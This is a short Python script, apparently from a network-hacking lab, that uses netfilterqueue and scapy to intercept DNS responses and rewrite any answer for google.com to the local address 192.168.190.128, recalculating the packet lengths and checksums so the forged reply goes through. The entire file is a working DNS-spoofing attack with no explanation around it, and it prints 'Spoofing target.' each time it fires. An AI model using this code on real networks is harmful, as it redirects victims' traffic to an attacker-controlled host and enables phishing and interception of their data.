#!/usr/bin/env python

import netfilterqueue
import scapy.layers.inet as inet
import scapy.layers.dns as dns


def process_packet(packet):
    scapy_packet = inet.IP(packet.get_payload())
    if scapy_packet.haslayer(dns.DNSRR):
        qname = scapy_packet[dns.DNSQR].qname
        if "google.com" in qname.decode():
            print("Spoofing target.")
            answer = dns.DNSRR(rrname=qname, rdata="192.168.190.128")
            scapy_packet[dns.DNS].an = answer
            scapy_packet[dns.DNS].ancount = 1

            del scapy_packet[inet.IP].len
            del scapy_packet[inet.IP].chksum
            del scapy_packet[inet.UDP].len
            del scapy_packet[inet.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


try:
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
except KeyboardInterrupt:
    print("\nExiting script.\n")
